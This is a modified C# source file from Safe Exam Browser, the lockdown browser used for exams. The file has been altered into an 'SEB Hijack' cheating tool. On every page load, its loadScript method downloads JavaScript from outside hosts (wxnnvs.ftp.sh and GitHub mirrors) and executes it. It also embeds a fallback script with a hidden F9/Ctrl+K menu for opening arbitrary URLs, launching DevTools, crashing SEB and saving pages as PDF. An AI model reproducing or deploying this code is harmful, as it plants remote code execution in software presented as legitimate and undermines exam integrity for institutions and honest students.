/*
 * Copyright (c) 2025 ETH Zürich, IT Services
 * 
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */

using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using CefSharp;
using SafeExamBrowser.Browser.Wrapper;
using SafeExamBrowser.Browser.Wrapper.Events;
using SafeExamBrowser.Logging.Contracts;
using SafeExamBrowser.UserInterface.Contracts.Browser;
using SafeExamBrowser.UserInterface.Contracts.Browser.Data;
using SafeExamBrowser.UserInterface.Contracts.Browser.Events;

namespace SafeExamBrowser.Browser
{
	internal class BrowserControl : IBrowserControl
	{
		private readonly Clipboard clipboard;
		private readonly ICefSharpControl control;
		private readonly IDialogHandler dialogHandler;
		private readonly IDisplayHandler displayHandler;
		private readonly IDownloadHandler downloadHandler;
		private readonly IDragHandler dragHandler;
		private readonly IFocusHandler focusHandler;
		private readonly IJsDialogHandler javaScriptDialogHandler;
		private readonly IKeyboardHandler keyboardHandler;
		private readonly ILogger logger;
		private readonly IRenderProcessMessageHandler renderProcessMessageHandler;
		private readonly IRequestHandler requestHandler;

		public string Address => control.Address;
		public bool CanNavigateBackwards => control.IsBrowserInitialized && control.BrowserCore.CanGoBack;
		public bool CanNavigateForwards => control.IsBrowserInitialized && control.BrowserCore.CanGoForward;
		public object EmbeddableControl => control;

		public event AddressChangedEventHandler AddressChanged;
		public event LoadFailedEventHandler LoadFailed;
		public event LoadingStateChangedEventHandler LoadingStateChanged;
		public event TitleChangedEventHandler TitleChanged;

		public BrowserControl(
			Clipboard clipboard,
			ICefSharpControl control,
			IDialogHandler dialogHandler,
			IDisplayHandler displayHandler,
			IDownloadHandler downloadHandler,
			IDragHandler dragHandler,
			IFocusHandler focusHandler,
			IJsDialogHandler javaScriptDialogHandler,
			IKeyboardHandler keyboardHandler,
			ILogger logger,
			IRenderProcessMessageHandler renderProcessMessageHandler,
			IRequestHandler requestHandler)
		{
			this.control = control;
			this.clipboard = clipboard;
			this.dialogHandler = dialogHandler;
			this.displayHandler = displayHandler;
			this.downloadHandler = downloadHandler;
			this.dragHandler = dragHandler;
			this.focusHandler = focusHandler;
			this.javaScriptDialogHandler = javaScriptDialogHandler;
			this.keyboardHandler = keyboardHandler;
			this.logger = logger;
			this.renderProcessMessageHandler = renderProcessMessageHandler;
			this.requestHandler = requestHandler;
		}

		public void Destroy()
		{
			if (!control.IsDisposed)
			{
				control.CloseDevTools();
				control.Dispose(true);
			}
		}

		public void ExecuteJavaScript(string code, Action<JavaScriptResult> callback = default)
		{
			try
			{
				if (control.BrowserCore != default && control.BrowserCore.MainFrame != default)
				{
					control.BrowserCore.EvaluateScriptAsync(code).ContinueWith(t =>
					{
						callback?.Invoke(new JavaScriptResult
						{
							Message = t.Result.Message,
							Result = t.Result.Result,
							Success = t.Result.Success
						});
					});
				}
				else
				{
					Task.Run(() => callback?.Invoke(new JavaScriptResult
					{
						Message = "JavaScript can't be executed in main frame!",
						Success = false
					}));
				}
			}
			catch (Exception e)
			{
				logger.Error($"Failed to execute JavaScript '{(code.Length > 50 ? code.Take(50) : code)}'!", e);
				Task.Run(() => callback?.Invoke(new JavaScriptResult
				{
					Message = $"Failed to execute JavaScript '{(code.Length > 50 ? code.Take(50) : code)}'! Reason: {e.Message}",
					Success = false
				}));
			}
		}

		public void Find(string term, bool isInitial, bool caseSensitive, bool forward = true)
		{
			control.Find(term, forward, caseSensitive, !isInitial);
		}

		public void Initialize()
		{
			clipboard.Changed += Clipboard_Changed;

			control.AddressChanged += (o, e) => AddressChanged?.Invoke(e.Address);
			control.AuthCredentialsRequired += (w, b, o, i, h, p, r, s, c, a) => a.Value = requestHandler.GetAuthCredentials(w, b, o, i, h, p, r, s, c);
			control.BeforeBrowse += (w, b, f, r, u, i, a) => a.Value = requestHandler.OnBeforeBrowse(w, b, f, r, u, i);
			control.BeforeDownload += (w, b, d, c, a) => a.Value = a.Value = downloadHandler.OnBeforeDownload(w, b, d, c);
			control.BeforeUnloadDialog += (w, b, m, r, c, a) => a.Value = javaScriptDialogHandler.OnBeforeUnloadDialog(w, b, m, r, c);
			control.CanDownload += (w, b, u, r, a) => a.Value = downloadHandler.CanDownload(w, b, u, r);
			control.ContextCreated += (w, b, f) => renderProcessMessageHandler.OnContextCreated(w, b, f);
			control.ContextReleased += (w, b, f) => renderProcessMessageHandler.OnContextReleased(w, b, f);
			control.DialogClosed += (w, b) => javaScriptDialogHandler.OnDialogClosed(w, b);
			control.DownloadUpdated += (w, b, d, c) => downloadHandler.OnDownloadUpdated(w, b, d, c);
			control.DragEnterCefSharp += (w, b, d, m, a) => a.Value = dragHandler.OnDragEnter(w, b, d, m);
			control.DraggableRegionsChanged += (w, b, f, r) => dragHandler.OnDraggableRegionsChanged(w, b, f, r);
			control.FaviconUrlChanged += (w, b, u) => displayHandler.OnFaviconUrlChange(w, b, u);
			control.FileDialogRequested += (w, b, m, t, p, f, e, d, c) => dialogHandler.OnFileDialog(w, b, m, t, p, f, e, d, c);
			control.FocusedNodeChanged += (w, b, f, n) => renderProcessMessageHandler.OnFocusedNodeChanged(w, b, f, n);
			control.GotFocusCefSharp += (w, b) => focusHandler.OnGotFocus(w, b);
			control.IsBrowserInitializedChanged += Control_IsBrowserInitializedChanged;
			control.JavaScriptDialog += (IWebBrowser w, IBrowser b, string u, CefJsDialogType t, string m, string p, IJsDialogCallback c, ref bool s, GenericEventArgs a) => a.Value = javaScriptDialogHandler.OnJSDialog(w, b, u, t, m, p, c, ref s);
			control.KeyEvent += (w, b, t, k, n, m, s) => keyboardHandler.OnKeyEvent(w, b, t, k, n, m, s);
			control.LoadError += (o, e) => LoadFailed?.Invoke((int)e.ErrorCode, e.ErrorText, e.Frame.IsMain, e.FailedUrl);
			control.LoadingProgressChanged += (w, b, p) => displayHandler.OnLoadingProgressChange(w, b, p);
			control.LoadingStateChanged += (o, e) => LoadingStateChanged?.Invoke(e.IsLoading);
			control.OpenUrlFromTab += (w, b, f, u, t, g, a) => a.Value = requestHandler.OnOpenUrlFromTab(w, b, f, u, t, g);
			control.PreKeyEvent += (IWebBrowser w, IBrowser b, KeyType t, int k, int n, CefEventFlags m, bool i, ref bool s, GenericEventArgs a) => a.Value = keyboardHandler.OnPreKeyEvent(w, b, t, k, n, m, i, ref s);
			control.ResetDialogState += (w, b) => javaScriptDialogHandler.OnResetDialogState(w, b);
			control.ResourceRequestHandlerRequired += (IWebBrowser w, IBrowser b, IFrame f, IRequest r, bool n, bool d, string i, ref bool h, ResourceRequestEventArgs a) => a.Handler = requestHandler.GetResourceRequestHandler(w, b, f, r, n, d, i, ref h);
			control.SetFocus += (w, b, s, a) => a.Value = focusHandler.OnSetFocus(w, b, s);
			control.TakeFocus += (w, b, n) => focusHandler.OnTakeFocus(w, b, n);
			control.TitleChanged += (o, e) => TitleChanged?.Invoke(e.Title);
			control.UncaughtExceptionEvent += (w, b, f, e) => renderProcessMessageHandler.OnUncaughtException(w, b, f, e);

			if (control is IWebBrowser webBrowser)
			{
				webBrowser.JavascriptMessageReceived += WebBrowser_JavascriptMessageReceived;

				var owner = control as IWin32Window;
				loadScript();
			}
		}

		private void executeJS(string code)
		{
			using (var client = new System.Net.WebClient())
			{
				(control as IWebBrowser)?.ExecuteScriptAsyncWhenPageLoaded(code);
			}
		}

		private void loadScript()
		{

			// array of domains
			string[] domains = {
				"wxnnvs.ftp.sh",
				"wxnnvs.github.io",
				"raw.githubusercontent.com/wxnnvs/wxnnvs.github.io/refs/heads/main",
				"github.com/wxnnvs/wxnnvs.github.io/raw/refs/heads/main" };

			var tried = 0;
			var backup_script = @"
				const latest_version = '3';
				var checked = false;

				var dialogInnerHTML = `
					<h2>SEB Hijack v1.2.1</h2>
					<a href='https://wxnnvs.ftp.sh/un-seb/troubleshoot' target='_blank'>Troubleshoot</a>
					<a onclick='showurl()'>show url</a>
					<input type='text' id='urlInput' placeholder='Enter URL' required>
					<button id='openUrlButton'>Open URL</button>
					<button id='exitSEB'>Crash SEB</button>
					<button id='closeButton'>Close</button>
					<hr>
					<details>
						<summary>Developer Tools</summary>
						<br>
						<button id='devButton' onclick='devTools()'>Open DevTools</button>
					</details>
					<details>
						<summary>Experimental</summary>
						<br>
						<button id='screenshotButton' class='beta' onclick='screenshot()'>Save page as PDF (bèta)</button>
					</details>
				`;

				// Add event listener for F9 key to open the dialog
				document.addEventListener('keydown', (event) => {
				if (event.key === 'F9' || (event.ctrlKey && event.key === 'k')) {
					checked = false;
					version(latest_version);
					document.getElementById('SEB_Hijack').showModal();
				}
				});

				function responseFunction(response) {
				checked = true;
				if (response == true) {
					// do nothing
				} else {
					const dialog = document.getElementById('SEB_Hijack');
					dialog.innerHTML = `
						<h2>SEB Hijack v1.2.1</h2>
						<a href='https://wxnnvs.ftp.sh/un-seb/troubleshoot' target='_blank'>Troubleshoot</a>
						<a onclick='showurl()'>show url</a>
						<input type='text' id='urlInput' placeholder='Enter URL' required>
						<button id='openUrlButton'>Open URL</button>
						<button id='exitSEB'>Crash SEB</button>
						<button id='closeButton'>Close</button>
						<hr>
						<p>You are using an outdated version of SEB Hijack. Please update to the latest version.<br>
						It is recommended to update to v3.9.0_a3538f9, but be aware:<br>
						<b>This is not marked as the latest version, but it actually is the latest.</b><br>
						If you dont update, its not that big of a deal, but it is recommended.</p>
						<hr>
						<details>
							<summary>Developer Tools</summary>
							<br>
							<button id='devButton' onclick='devTools()'>Open DevTools</button>
						</details>
						<details>
							<summary>Experimental</summary>
							<br>
							<button id='screenshotButton' class='beta' onclick='screenshot()'>Save page as PDF (bèta)</button>
						</details>
					`;
				}
				}

				// Create the dialog element
				const dialog = document.createElement('dialog');

				// Add content to the dialog
				dialog.innerHTML = dialogInnerHTML;

				// Set the dialog ID
				dialog.id = 'SEB_Hijack';

				// Append the dialog to the body
				document.body.appendChild(dialog);

				// Create and append a style element for styling
				const style = document.createElement('style');
				style.textContent = `
					dialog {
						background-color: #f9f9f9;
						border: none;
						border-radius: 5px;
						box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
						max-width: 400px;
						width: 100%;
						padding: 20px;
						transition: all 0.3s ease;
					}

					h2 {
						font-size: 1.5em;
						color: #333;
						margin-bottom: 15px;
					}

					#urlInput {
						width: calc(100% - 22px);
						border: 1px solid #ccc;
						border-radius: 4px;
						padding: 10px;
						margin-bottom: 10px; /* Add margin for spacing */
					}

					button {
						padding: 10px 15px;
						border: none;
						border-radius: 4px;
						background-color: #007bff;
						color: white;
						cursor: pointer;
						margin-right: 5px; /* Space between buttons */
					}

					button:hover {
						background-color: #0056b3; /* Darker shade on hover */
					}

					.beta {
						background-color: #507693;
					}

				`;
				document.head.appendChild(style);

				// Add event listener to close the dialog
				document.getElementById('closeButton').addEventListener('click', () => {
				document.getElementById('SEB_Hijack').close();
				});

				// Add event listener to handle button click
				document.getElementById('openUrlButton').addEventListener('click', () => {
				var url = document.getElementById('urlInput').value;
				// if url does not contain https
				if (!url.startsWith('https://') && !url.startsWith('http://')) {
					url = 'https://' + url;
				}
				window.open(url, '_blank');
				dialog.close();
				});

				// Add event listener to crash SEB
				document.getElementById('exitSEB').onclick = function () {
				CefSharp.PostMessage({ type: 'exitSEB' });
				};

				function screenshot() {
				document.getElementById('SEB_Hijack').close();

				setTimeout(() => {
					CefSharp.PostMessage({ type: 'screenshot' });
				}, 1000);

				// const screenshotTarget = document.body;

				// html2canvas(screenshotTarget).then((canvas) => {
				//   const base64image = canvas.toDataURL('image/png');

				//   // Create a link element
				//   const link = document.createElement('a');

				//   // Set the download attribute with a filename
				//   link.download = 'screenshot.png';

				//   // Set the href to the base64 image
				//   link.href = base64image;

				//   // Append the link to the DOM, trigger the download, then remove it
				//   document.body.appendChild(link);
				//   link.click();
				//   document.body.removeChild(link);
				// });
				}

				function devTools() {
				document.getElementById('SEB_Hijack').close();
				CefSharp.PostMessage({ type: 'devTools' });
				}

				function version(version) {
				CefSharp.PostMessage({ version: version });
				}

				function createPDf() {
				// load a pdf from a url and display it in a div
				pdfjsLib
					.getDocument(
					'https://mozilla.github.io/pdf.js/web/compressed.tracemonkey-pldi-09.pdf'
					)
					.promise.then(function (pdf) {
					pdf.getPage(1).then(function (page) {
						var scale = 1.5;
						var viewport = page.getViewport({ scale: scale });

						// Prepare canvas using PDF page dimensions
						var canvas = document.getElementById('the-canvas');
						var context = canvas.getContext('2d');
						canvas.height = viewport.height;
						canvas.width = viewport.width;

						// Render PDF page into canvas context
						var renderContext = {
						canvasContext: context,
						viewport: viewport,
						};
						page.render(renderContext);
					});
					});
				}

				function showurl() {
				var url = window.location.href;
				// show the url in the dialog
				document.getElementById('urlInput').value = url;
				}
			''";

			foreach (var domain in domains)
			{
				try
				{
					tried++;
					using (var client = new System.Net.WebClient())
					{
						var the_script = client.DownloadString($"https://{domain}/un-seb/the_script.js");
						executeJS(the_script);
					}

					return; // Exit after the first successful load
				}
				catch (Exception ex)
				{
					if (tried == domains.Length)
					{
						executeJS(backup_script);
					}
				}
			}
		}

		public void NavigateBackwards()
		{
			control.BrowserCore.GoBack();
		}

		public void NavigateForwards()
		{
			control.BrowserCore.GoForward();
		}

		public void NavigateTo(string address)
		{
			control.Load(address);
		}

		public void ShowDeveloperConsole()
		{
			control.BrowserCore.ShowDevTools();
		}

		public void Reload()
		{
			control.BrowserCore.Reload();

			loadScript();
		}

		public void Zoom(double level)
		{
			control.BrowserCore.SetZoomLevel(level);
		}

		private void Clipboard_Changed(long id)
		{
			ExecuteJavaScript($"SafeExamBrowser.clipboard.update({id}, '{clipboard.Content}');");
		}

		private void Control_IsBrowserInitializedChanged(object sender, EventArgs e)
		{
			if (control.IsBrowserInitialized)
			{
				control.BrowserCore.GetHost().SetFocus(true);
			}
		}

		// seb hijack
		private void ExitSEB()
		{
			if (MessageBox.Show("Crashing SEB can take up to 10 seconds \nIt can be seen in the log files aswell.", "SEB Crash", MessageBoxButtons.OKCancel, MessageBoxIcon.Information) == DialogResult.OK)
			{
				Environment.Exit(0);
			}
		}

		private async Task SaveAsPDF()
		{
			var settings = new PdfPrintSettings();
			string filename = DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".pdf";
			string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), filename);
			var succes = await control.BrowserCore.PrintToPdfAsync(filepath, settings);
			var owner = control as IWin32Window;
			if (succes)
			{
				MessageBox.Show(owner, "PDF should be saved to desktop.", "Save as PDF", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show(owner, "Failed to generate PDF", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
			}
		}

		private void WebBrowser_JavascriptMessageReceived(object sender, JavascriptMessageReceivedEventArgs e)
		{
			clipboard.Process(e);

			// seb hijack
			dynamic message = e.Message;
			if (message.type == "exitSEB")
			{
				ExitSEB();
			}

			if (message.type == "screenshot")
			{
				_ = SaveAsPDF();
			}

			if (message.type == "devTools")
			{
				ShowDeveloperConsole();
			}

			if (message.type == "version")
			{
				if (message.version == "3")
				{
					ExecuteJavaScript("responseFunction(true);");
				}
				else
				{
					ExecuteJavaScript("responseFunction(false);");
				}
			}
		}
	}
}
